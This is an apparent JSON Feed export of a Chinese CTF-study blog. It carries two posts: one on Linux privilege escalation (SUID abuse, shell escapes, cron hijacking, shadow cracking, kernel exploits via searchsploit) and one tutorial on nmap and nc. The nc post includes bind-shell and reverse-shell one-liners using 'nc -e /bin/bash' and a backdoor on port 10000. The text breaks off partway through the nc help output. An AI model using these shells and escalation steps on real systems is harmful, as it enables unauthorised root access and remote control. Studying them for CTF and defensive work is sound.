{
    "version": "https://jsonfeed.org/version/1",
    "title": "Glad to see U (◦˙▽˙◦)",
    "subtitle": "Never hack for profit",
    "icon": "https://ctf-learner.github.io/assets/favicon.ico",
    "description": "Never hack for profit",
    "home_page_url": "https://ctf-learner.github.io",
    "items": [
        {
            "id": "https://ctf-learner.github.io/post/Linux%E6%8F%90%E6%9D%83%E6%96%B0%E6%89%8B%E6%9D%91/",
            "url": "https://ctf-learner.github.io/post/Linux%E6%8F%90%E6%9D%83%E6%96%B0%E6%89%8B%E6%9D%91/",
            "title": "Linux提权新手村",
            "date_published": "2024-04-15T14:35:32.000Z",
            "content_html": "<p>前记：在许多次 web-Bypass 后， <code>cat /flag</code>  却没有任何回显，总是被脚本的权限所困扰，然后就有了这篇文章，以借鉴为主，之后在实践中尝试、学习</p>\n<h1 id=\"linux提权\"><a class=\"anchor\" href=\"#linux提权\">#</a> Linux 提权</h1>\n<h2 id=\"suid与sudo提权\"><a class=\"anchor\" href=\"#suid与sudo提权\">#</a> SUID 与 sudo 提权</h2>\n<p>简单了解什么是 suid：</p>\n<blockquote>\n<p>SUID 是 Set User ID（设置用户标识）的缩写。当一个可执行文件被设置了 SUID 位时，它将在执行时拥有该文件所有者的权限。这意味着，无论谁执行这个文件，它都会以文件所有者的权限运行，而不是执行者自己的权限。<br />\nSUID 位的主要用途是允许普通用户执行一些需要特权权限的程序，而无需提升到超级用户（root）身份。例如， <code>passwd</code>  命令通常需要 root 权限才能修改用户密码文件，但是如果  <code>passwd</code>  程序被设置了 SUID 位，并且拥有 root 所有者，则普通用户也可以通过运行  <code>passwd</code>  命令来修改自己的密码，因为在执行时  <code>passwd</code>  程序将以 root 权限运行。</p>\n</blockquote>\n<h3 id=\"遍历目录中的suid文件\"><a class=\"anchor\" href=\"#遍历目录中的suid文件\">#</a> 遍历目录中的 suid 文件</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-u</span><span class=\"token operator\">=</span>s <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null  <span class=\"token comment\"># 得到所有 suid 文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>用sudo <span class=\"token parameter variable\">-l</span> 查看哪些命令能被sudo</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"https://s2.loli.net/2024/04/13/sltUpViX5dxjFoG.png\" alt=\"suid文件.png\" /></p>\n<h3 id=\"nmap交互模式\"><a class=\"anchor\" href=\"#nmap交互模式\">#</a> nmap 交互模式</h3>\n<p>nmap 5.20（使用 ``nmap -v <code>查看nmap版本）之前有一个</code>  interactive <code>交互模式，在</code>  nmap effective uid=0` 时，可以通过这个模式获得 root 权限交互式命令行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">--interactive</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 通杀版：</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"os.execute('/bin/bash')\"</span> <span class=\"token operator\">></span> ./shell</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>nmap <span class=\"token parameter variable\">--script</span><span class=\"token operator\">=</span>shell</pre></td></tr></table></figure><h3 id=\"find\"><a class=\"anchor\" href=\"#find\">#</a> find</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-exec</span> <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">find</span> <span class=\"token parameter variable\">-exec</span> /bin/bash</pre></td></tr></table></figure><p>find 命令自带 - exec 参数，可以执行命令，若 find 有 suid 权限，那么使用 exec 相当于直接提权到 root.</p>\n<h3 id=\"vim\"><a class=\"anchor\" href=\"#vim\">#</a> vim</h3>\n<p>vim 进入编辑时，使用 <code>:!shell</code>  进入 shell 交互模式</p>\n<blockquote>\n<p>同理： <code>man</code> 、 <code>git、</code>   <code>config</code>  、 <code>help</code> 、 <code>more</code> 、 <code>less</code> 、 <code>vim</code> 、 <code>vi</code> 、 <code>ftp</code> 、 <code>gdb</code>  等命令都有自己的 shell，我们只需在他们各自的 shell 中执行 ``/bin/sh <code>即可 一般都是在shell键入</code> :!/bin/sh` 来 bypass rbash</p>\n</blockquote>\n<h3 id=\"bash\"><a class=\"anchor\" href=\"#bash\">#</a> bash</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-p</span>  开启一个新root shell，前提是uid<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr></table></figure><h3 id=\"exim\"><a class=\"anchor\" href=\"#exim\">#</a> exim</h3>\n<p>exim 在特定版本下会有 suid 提权，可以通过<a href=\"\"> searchsploit 查看</a></p>\n<h3 id=\"rbash提权\"><a class=\"anchor\" href=\"#rbash提权\">#</a> rbash 提权</h3>\n<p>具体看<a href=\"http://t.csdnimg.cn/EIwvy\">这篇文章</a>，往后遇到回来补习</p>\n<h3 id=\"python提权\"><a class=\"anchor\" href=\"#python提权\">#</a> python 提权</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token operator\">-</span>c <span class=\"token string\">\"import os;os.system('/bin/bash')\"</span></pre></td></tr></table></figure><h3 id=\"php-shell\"><a class=\"anchor\" href=\"#php-shell\">#</a> php shell</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php <span class=\"token operator\">-</span>a 进入php shell</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>执行命令<span class=\"token punctuation\">:</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bin/bash\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"perl\"><a class=\"anchor\" href=\"#perl\">#</a> perl</h3>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>perl <span class=\"token operator\">-e</span> <span class=\"token string\">'exec \"/bin/sh\";'</span></pre></td></tr></table></figure><h3 id=\"ruby\"><a class=\"anchor\" href=\"#ruby\">#</a> ruby</h3>\n<figure class=\"highlight ruby\"><figcaption data-lang=\"ruby\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ruby <span class=\"token operator\">-</span>e <span class=\"token string-literal\"><span class=\"token string\">'exec \"/bin/bash\"'</span></span></pre></td></tr></table></figure><h3 id=\"cp复制命令\"><a class=\"anchor\" href=\"#cp复制命令\">#</a> cp 复制命令</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cp</span> /bin/bash/* <span class=\"token builtin class-name\">.</span>    <span class=\"token comment\"># 复制 /bin/bash 下所有命令到当前目录</span></pre></td></tr></table></figure><h3 id=\"爆破shadow\"><a class=\"anchor\" href=\"#爆破shadow\">#</a> 爆破 shadow</h3>\n<p>/etc/passwd 默认所有用户可读，但只有 root 可写。 /etc/passwd 里的用户口令往往以 x 代替，其加密后的密码会存入 /etc/shadow 里面，/etc/shadow 默认只有 root 可读。如果 /etc/shadow 可读，我们可以用 hashcat 或者 john 暴力破解 shadow 文件，</p>\n<h3 id=\"文件重写\"><a class=\"anchor\" href=\"#文件重写\">#</a> 文件重写</h3>\n<p>计划任务由 crontab 管理，非 root 用户是无法列出 root 用户的计划任务的，但我们可以列出 /etc 的系统任务，系统任务默认是 root 权限运行的</p>\n<pre><code class=\"language-纯文本\">ls -l /etc/cron*\n</code></pre>\n<p>如果有权限能更改其中一个任务指定的脚本，我们就可以往脚本里添加如反弹 shell 等指令，从而提权</p>\n<h3 id=\"环境变量劫持\"><a class=\"anchor\" href=\"#环境变量劫持\">#</a> 环境变量劫持</h3>\n<p>利用 LD_PRELOAD 优先加载指定的共享库文件，劫持系统命令</p>\n<p>细读 p 神文章：</p>\n<p><a href=\"https://tttang.com/archive/1450/\">我是如何利用环境变量注入执行任意命令 - 跳跳糖 (tttang.com)</a></p>\n<h3 id=\"利用通配符提权\"><a class=\"anchor\" href=\"#利用通配符提权\">#</a> 利用通配符提权</h3>\n<p><a href=\"https://www.secpulse.com/archives/72965.html\">利用通配符实现 Linux 本地提权 - SecPulse.COM | 安全脉搏</a></p>\n<h2 id=\"linux-内核提权\"><a class=\"anchor\" href=\"#linux-内核提权\">#</a> Linux 内核提权</h2>\n<blockquote>\n<p>苯人 web 选手学不会 pwn 那么多原理，只会用 exp 照着 cve 的 wp 直接打</p>\n</blockquote>\n<h3 id=\"查看linux操作系统的内核版本和相关信息\"><a class=\"anchor\" href=\"#查看linux操作系统的内核版本和相关信息\">#</a> 查看 Linux 操作系统的内核版本和相关信息</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> /etc/issue  <span class=\"token comment\"># 查看 ubuntu 或者 centos 的版本</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">cat</span> /etc/*-release <span class=\"token comment\"># 查看 centos 版本</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">uname</span> <span class=\"token parameter variable\">-a</span> <span class=\"token comment\"># 查看系统全部信息</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">uname</span> <span class=\"token parameter variable\">-r</span> <span class=\"token comment\"># 查看内核版本 -- 比较重要</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"https://s2.loli.net/2024/04/13/g5nCthcxv8WEPBr.png\" alt=\"Linux 3.10.0.png\" /></p>\n<h3 id=\"searchsploit离线工具\"><a class=\"anchor\" href=\"#searchsploit离线工具\">#</a> searchsploit 离线工具</h3>\n<blockquote>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">\n<p>“searchsploit” 是一个用于 Exploit-DB 的命令行搜索工具，它还允许你随身带一份 Exploit-DB 的副本。</p>\n</li>\n<li class=\"lvl-2\">\n<p>SearchSploit 提供了在本地保存的存储库中执行详细的离线搜索的能力。</p>\n</li>\n<li class=\"lvl-2\">\n<p>许多漏洞都包含了二进制文件的链接，这些文件不包含在标准存储库中，但可以在 Exploit-DB 二进制文件中找到。</p>\n</li>\n</ul>\n</blockquote>\n<p>开赛前，请记得<strong>更新 searchsploit</strong>！</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">apt</span> update <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">apt</span> <span class=\"token parameter variable\">-y</span> full-upgrade</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>searchsploit <span class=\"token parameter variable\">-u</span></pre></td></tr></table></figure><details open>\n<summary><span class=\"pre-summary\">&nbsp;</span><mark>使用 tips，点击打开</mark></summary><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">选项</th>\n<th style=\"text-align:center\">功能</th>\n<th style=\"text-align:left\">例如</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">-t</td>\n<td style=\"text-align:center\">仅对标题搜索</td>\n<td style=\"text-align:left\"><code>searchsploit -t smb windows remote</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">--exclude</td>\n<td style=\"text-align:center\">选项删除不想要的结果</td>\n<td style=\"text-align:left\"><code>searchsploit smb windows remote --exclude=&quot;(POC)|txt&quot;</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-p</td>\n<td style=\"text-align:center\">复制到剪切板</td>\n<td style=\"text-align:left\"><code>searchsploit -p 42315.py</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-m</td>\n<td style=\"text-align:center\">复制到当前工作目录</td>\n<td style=\"text-align:left\"><code>searchsploit -m 42315.py</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-w</td>\n<td style=\"text-align:center\">联网搜索</td>\n<td style=\"text-align:left\"><code>searchsploit -w smb windows remote</code></td>\n</tr>\n</tbody>\n</table>\n</details>\n<p>searchsploit 后面可以填入多个搜索关键词</p>\n<p><code>searchsploit [keywords1] [keywords2] ...</code></p>\n<p>注意：SearchSploit 使用 AND 运算符，而不是 OR 运算符。使用的术语越多，滤除的结果越多。</p>\n<p><code>searchsploit -m 50135.c</code> <br />\n<img loading=\"lazy\" data-src=\"https://s2.loli.net/2024/04/13/vIKTHaJA59FWVBq.png\" alt=\"Ubuntu18.04.6.png\" /></p>\n<p><strong>-m 选项同时可以获取该 poc 的 cve 信息，直接搜索引擎复现提权</strong><br />\n searchsploit 获取的 poc 需要<strong>上传 Linux 后编译</strong>，而不能在 kali 中编译<br />\n <code>gcc -o test 50808.c</code></p>\n<div class=\"note warning\">\n<p>具体流程大概这样，具体提权的方法因靶机而异</p>\n</div>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接：</h2>\n<p><a href=\"https://const27.com/\">https://const27.com/</a></p>\n",
            "tags": []
        },
        {
            "id": "https://ctf-learner.github.io/post/%E4%B8%8D%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8/",
            "url": "https://ctf-learner.github.io/post/%E4%B8%8D%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8/",
            "title": "nc&nmap",
            "date_published": "2024-04-15T09:44:44.000Z",
            "content_html": "<h1 id=\"nmap-nc命令学习\"><a class=\"anchor\" href=\"#nmap-nc命令学习\">#</a> nmap、nc 命令学习</h1>\n<h2 id=\"namp\"><a class=\"anchor\" href=\"#namp\">#</a> namp</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token punctuation\">[</span>Scan Type<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>Options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span>target specification<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"目标说明\"><a class=\"anchor\" href=\"#目标说明\">#</a> 目标说明</h3>\n<blockquote>\n<p>ip/&lt;numbit&gt;: Nmap 将会扫描所有和该参考 IP 地址具有 &lt;numbit &gt; 相同比特的所有 IP 地址或主机.</p>\n<blockquote>\n<p>例如，192.168.10.0/24 将会扫描 192.168.10.0 和 192.168.10.255 之间的 256 台主机。192.168.10.40/24 将会做同样的事情。</p>\n</blockquote>\n</blockquote>\n<h3 id=\"主机发现\"><a class=\"anchor\" href=\"#主机发现\">#</a> 主机发现</h3>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-iL &lt;inputfilename&gt;</td>\n<td>从文件中输入</td>\n<td>--excludefile &lt;excludefile&gt; 同理</td>\n</tr>\n<tr>\n<td>--exclude &lt;host1[，host2][，host3]，...&gt;</td>\n<td>排除主机 / 网络</td>\n<td>以逗号分隔的列表排除它们</td>\n</tr>\n<tr>\n<td>-sL</td>\n<td>列表扫描</td>\n<td>仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机</td>\n</tr>\n<tr>\n<td>-sP</td>\n<td>Ping 扫描</td>\n<td>进行 ping 扫描，打印出对扫描做出响应的主机</td>\n</tr>\n<tr>\n<td>-P0</td>\n<td>无 ping</td>\n<td></td>\n</tr>\n<tr>\n<td>-n</td>\n<td>不用域名解析</td>\n<td>不对它发现的活动 IP 地址进行反向域名解析</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"端口扫描\"><a class=\"anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p>nmap 把端口分成六个状态: open (开放的)， closed (关闭的)，filtered (被过滤的)， unfiltered (未被过滤的)， open|filtered (开放或者被过滤的)，或者 closed|filtered (关闭或者被过滤的)</p>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-sS</td>\n<td>TCP SYN 扫描</td>\n<td><strong>常用</strong>、快速执行、不打开一个完全的 TCP 链接</td>\n</tr>\n<tr>\n<td>-sT</td>\n<td>TCP connect () 扫描</td>\n<td></td>\n</tr>\n<tr>\n<td>-sU</td>\n<td>UDP 扫描</td>\n<td>UDP 扫描一般较慢，可以使用 --host-timeout 跳过慢速的主机</td>\n</tr>\n<tr>\n<td>-p &lt;port ranges&gt;</td>\n<td>只扫描指定的端口或端口范围</td>\n<td>-p - 从端口 1 扫描到 65535</td>\n</tr>\n<tr>\n<td>-sV</td>\n<td>版本探测</td>\n<td>也可以 - A 同时启用操作系统检测和版本检测</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"输出格式\"><a class=\"anchor\" href=\"#输出格式\">#</a> 输出格式</h3>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-oN &lt;filespec&gt;</td>\n<td>标准输出</td>\n<td>直接写入指定的文件</td>\n</tr>\n<tr>\n<td>-oG &lt;filespec&gt;</td>\n<td>Grep 输出</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"常用实例\"><a class=\"anchor\" href=\"#常用实例\">#</a> 常用实例</h3>\n<div class=\"note warning\">\n<p><strong>注意：</strong><br />\n如果是为了测试，<a href=\"http://scanme.nmap.org\">scanme.nmap.org</a> 允许被扫描。但仅允许使用 Nmap 扫描并禁止测试漏洞或进行 DoS 攻击。</p>\n</div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>/<span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>子网掩码<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 网段扫描</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> ip/子网掩码 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 扫描存活主机</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>nmap <span class=\"token parameter variable\">-sV</span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>端口号或范围<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>nmap <span class=\"token parameter variable\">-sS</span> -p- <span class=\"token number\">192.168</span>.0.2 <span class=\"token comment\"># 扫描主机全部端口</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">172.20</span>.x.x/24</pre></td></tr></table></figure><p><a href=\"https://nmap.org/man/zh/index.html\">官方文档：</a><a href=\"https://nmap.org/man/zh/index.html\">https://nmap.org/man/zh/index.html</a></p>\n<h2 id=\"nc基础使用\"><a class=\"anchor\" href=\"#nc基础使用\">#</a> nc 基础使用</h2>\n<p>监听本地端口</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvvp</span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr></table></figure><p>连接指定端口</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr></table></figure><h3 id=\"传送exp\"><a class=\"anchor\" href=\"#传送exp\">#</a> 传送 exp</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> exp.txt <span class=\"token operator\">|</span> <span class=\"token function\">nc</span> <span class=\"token parameter variable\">-nv</span> <span class=\"token number\">192.168</span>.x.x <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-nv</span> <span class=\"token number\">192.168</span>.x.x <span class=\"token number\">80</span> <span class=\"token operator\">&lt;</span> exp.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 两种方式均可以讲 exp 输送到指定端口，而服务器需要开放对应端口</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">80</span> <span class=\"token operator\">></span> /tmp/received_exploit.txt</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 服务器监听端口并保存 exp</span></pre></td></tr></table></figure><h3 id=\"日志打印\"><a class=\"anchor\" href=\"#日志打印\">#</a> 日志打印</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">80</span> <span class=\"token operator\">>></span> /apache/log.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 在 awd 中，攻击 80 端口的信息都会被打印下来，> 表示覆写，>> 表示追加</span></pre></td></tr></table></figure><h3 id=\"-a选项的使用\"><a class=\"anchor\" href=\"#-a选项的使用\">#</a> -A 选项的使用</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">选项</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">-A + -sV</td>\n<td>启用版本检测，用于识别目标主机上运行的服务及其版本信息</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A + -O</td>\n<td>启用操作系统检测，尝试识别目标主机的操作系统类型和版本</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A + -T4</td>\n<td>设置扫描的速度级别为快速（4），加快扫描速度但可能导致被检测到</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A</td>\n<td>执行高级扫描和识别</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"nc命令进阶使用\"><a class=\"anchor\" href=\"#nc命令进阶使用\">#</a> nc 命令进阶使用</h2>\n<h3 id=\"创造后门\"><a class=\"anchor\" href=\"#创造后门\">#</a> 创造后门</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ncat <span class=\"token parameter variable\">-l</span> <span class=\"token number\">10000</span> <span class=\"token parameter variable\">-e</span> /bin/bash</pre></td></tr></table></figure><p><code>-e</code>  标志将一个  <code>bash</code>  与端口  <code>10000</code>  相连。现在客户端只要连接到服务器上的  <code>10000</code>  端口就能通过  <code>bash</code>  获取我们系统的完整访问权限：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ncat <span class=\"token number\">192.168</span>.1.100 <span class=\"token number\">10000</span> <span class=\"token comment\"># 攻击机上连接服务器</span></pre></td></tr></table></figure><h3 id=\"扫描端口\"><a class=\"anchor\" href=\"#扫描端口\">#</a> 扫描端口</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>port-port<span class=\"token operator\">></span></pre></td></tr></table></figure><p>可以利用 - w 设置超时时间，-z 扫描，-u 设置为 UDP 模式，例如：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-u</span> <span class=\"token parameter variable\">-z</span> <span class=\"token parameter variable\">-w2</span> <span class=\"token number\">192.168</span>.0.1 <span class=\"token number\">1</span>-65535 <span class=\"token comment\"># 扫描 192.168.0.3 的端口 范围是 1-65535 即全部端口</span></pre></td></tr></table></figure><div class=\"note warning\">\n<p><strong>注意：nc 扫描会留下大量的痕迹。</strong></p>\n</div>\n<h3 id=\"反向连接弹shell\"><a class=\"anchor\" href=\"#反向连接弹shell\">#</a> 反向连接弹 shell</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-e</span> /bin/bash <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 服务端发起连接</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvp</span> <span class=\"token punctuation\">\\</span><span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 攻击机连 shell</span></pre></td></tr></table></figure><h3 id=\"完整使用说明\"><a class=\"anchor\" href=\"#完整使用说明\">#</a> 完整使用说明</h3>\n<blockquote>\n<p>教程再好终归不如官方文档</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─<span class=\"token comment\"># nc -h                 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span>v1.10-47<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>连接:   <span class=\"token function\">nc</span> <span class=\"token punctuation\">[</span>-options<span class=\"token punctuation\">]</span> <span class=\"token function\">hostname</span> port<span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>ports<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">..</span>. </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>监听入站:     <span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> port <span class=\"token punctuation\">[</span>-options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>hostname<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>port<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>options:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token parameter variable\">-c</span> shell commands       命令为“-e”；prog 程序重定向，使用 /bin/sh 执行 <span class=\"token punctuation\">[</span>危险！！<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token parameter variable\">-e</span> filename             连接后执行的程序<span class=\"token punctuation\">[</span>危险！！<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token parameter variable\">-b</span>                      允许广播</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token parameter variable\">-g</span> gateway              网关源路由跳跃点，最多 <span class=\"token number\">8</span> 个</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token parameter variable\">-G</span> num                  源路由指针：4, <span class=\"token number\">8</span>, <span class=\"token number\">12</span>, <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token parameter variable\">-h</span>                      this cruft  这个废话,就是帮助</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token parameter variable\">-i</span> secs                 发送线路、扫描端口的延迟间隔</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token parameter variable\">-k</span>                      设置套接字上的 keepalive 选项</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token parameter variable\">-l</span>                      监听模式，用于入站连接</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token parameter variable\">-n</span>                      仅数字 IP 地址，无 DNS</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token parameter variable\">-o</span> <span class=\"token function\">file</span>                 文件十六进制转储流量</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token parameter variable\">-p</span> port                 本地端口号</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token parameter variable\">-r</span>                      随机化本地和远程端口</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        